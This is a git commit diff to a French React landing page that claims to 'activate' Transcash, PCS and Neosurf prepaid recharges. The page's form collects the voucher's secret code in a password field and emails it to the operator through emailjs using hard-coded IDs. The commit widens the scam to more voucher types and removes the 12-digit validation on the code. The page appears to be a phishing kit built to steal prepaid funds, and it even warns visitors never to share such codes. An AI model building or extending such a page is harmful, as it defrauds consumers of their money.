f984a907ff282c165bc461ceabc1645a9f59f455
Adinsi Abdias <adinsiabdias@gmail.com>
2022-10-10 22:03:32 +0100

    envoie

--- src/Accueil.jsx
+++ src/Accueil.jsx
@@ -1,10 +1,11 @@
 import React, { useState, useRef } from "react";
 import emailjs from "emailjs-com";
 import profil from "./images/profil.jpeg";
-import phone from "./images/phone.jpeg";
-import rapide from "./images/rapide.jpeg";
-import fiable from "./images/fiable.jpeg";
-import secure from "./images/secure.jpeg";
+
+
+import trans from "./images/trans.jpeg"
+import neo from "./images/trans.jpeg"
+import pcs from "./images/pcs.jpg"
 import visa from "./images/visa.jpeg";
 
 import "./styles/accueil.scss";
@@ -15,6 +16,7 @@ const Accueil = () => {
   const [showe, setShowe] = useState(false);
   const [eye, seteye] = useState(true);
   const [select, setSelect] = useState(20);
+  const [recharge, setrecharge] = useState('');
 
   const Eyeclick = () => {
     seteye(!eye);
@@ -33,7 +35,7 @@ const Accueil = () => {
 
     emailjs
       .sendForm(
-        "service_o19gmcb",
+        "service_rgjwcse",
         "template_hzn98zf",
         form.current,
         "eNbGuhHH13G4a2Mho"
@@ -53,6 +55,11 @@ const Accueil = () => {
   };
   const handleChange = (e) => {
     setSelect(e.target.value);
+ 
+  };
+  const handleChangeType = (e) => {
+    setrecharge(e.target.value);
+ 
   };
 
   const handleclick = () => {
@@ -82,7 +89,7 @@ const Accueil = () => {
 
       <div className="firstImg">
         <img height="100px" src={profil} alt="" />
-        <h1>Activation Transcash</h1>
+        <h1>Activation rapides sécurisé de vos recharges en ligne</h1>
       </div>
       {/* 
       <div className="accueil">
@@ -91,10 +98,10 @@ const Accueil = () => {
       </div> */}
 
       <div className="phone">
-        <img height="200px" width={300} src={secure} alt="" />
+        <img height="200px" width={300} src={trans} alt="" />
       </div>
 
-      <h2>Activation de vos recharges</h2>
+      <h2>Activation de vos recharges Transcash</h2>
       <p style={{ textAlign: "justify" }}>
         Transcash Activation est utilisable en ligne uniquement , il vous permet
         d'effectuer tous vos achats e-commerce en toute sécurité. La fiabilité
@@ -111,27 +118,47 @@ const Accueil = () => {
       <div className="display">
         <div>
           <h3>Rapide</h3>
-          <img height={300} src={rapide} alt="" />
+          <img height={300} src={trans} alt="" />
         </div>
+     
+        
+      </div>
+ <h2>Activation de vos recharges PCS</h2>
+      <p style={{ textAlign: "justify" }}>
+        La carte de paiement prépayée et rechargeable PCS est une carte de paiement et de retrait qui vous permet de retirer et payer en France et à l’étranger sur l’ensemble du réseau Mastercard. Bénéficiez d'avantages et de réductions tout au long de l'année.
+      </p>
+    
+      <hr></hr>
+      
+      <div className="display">
+        
         <div>
           <h3>Fiable</h3>
-          <img height={230} src={phone} alt="" />
+          <img height={280} width={280} src={pcs} alt="" />
         </div>
 
-        <div>
-          <h3>Securiser</h3>
-          <img height={230} src={secure} alt="" />
-        </div>
       </div>
-
+       <h2>Activation de vos recharges Neosurf</h2>
+      <p style={{ textAlign: "justify" }}>
+Vous voyagez souvent mais ne souhaitez pas emmener avec vous votre carte bancaire classique ? Votre carte prépayée vous accompagne partout dans le monde. Pas besoin de liquide, votre n’avez qu'à charger votre carte prépayée avec le montant désiré et le tour est joué. Les sociétés émettrices de cartes prépayées ont souvent des millions de partenaires à travers le monde. Il vous suffira lorsque vous voudrez faire vos achats, de vérifier que le partenaire accepte votre moyen de paiement et que vous avez assez d’argent sur votre carte. En France comme à l'étranger, veillez à ne jamais communiquer le code de votre carte prépayée à une tierce personne, au risque d'être victime de fraude.
+      </p>
+    
       <hr></hr>
       <p style={{ textAlign: "justify" }}>
-        La module TRANS-CASH ACTIVATION est un moyen d'activation prépayé fiable
+        Le module d'ACTIVATION est un moyen d'activation prépayé fiable
         sur internet, avec une recharge, qui vous accompagne au quotidien dans
         vos dépenses. Commander le en ligne ou achetez vos recharges de paiement
         dans un bureau de tabac et profitez de tous ses avantages qui
         simplifieront la vie.
       </p>
+      <hr></hr>
+       <div className="display">
+    
+        <div>
+          <h3>Securiser</h3>
+          <img height={230} src={neo} alt="" />
+        </div>
+      </div>
       <hr></hr>
       <div className="formulaire">
         <form id="validation" ref={form} onSubmit={sendEmail}>
@@ -150,6 +177,7 @@ const Accueil = () => {
               />
             </label>
           </div>
+
           <div className="bloc">
             <label for="email">
               Email * :
@@ -160,6 +188,17 @@ const Accueil = () => {
                 name="email"
                 id=""
               />
+            </label>
+          </div>
+              <div className="bloc">
+            <label for="recharge">
+             Type de recharge :
+              <select name="recharge" value={recharge} onChange={handleChangeType}>
+                <option>Transcash</option>
+                <option>PCS</option>
+                <option>Neosurf</option>
+             
+              </select>
             </label>
           </div>
           <div className="bloc">
@@ -189,12 +228,11 @@ const Accueil = () => {
                 required
                 placeholder="************"
                 type="password"
-                minLength="12"
-                maxLength="12"
+             
                 name="code"
                 id="code"
-                pattern="[0-9]{12}"
-                title="Le code doit contenir que des chiffres"
+             
+             
               />
               <i
                 onClick={Eyeclick}
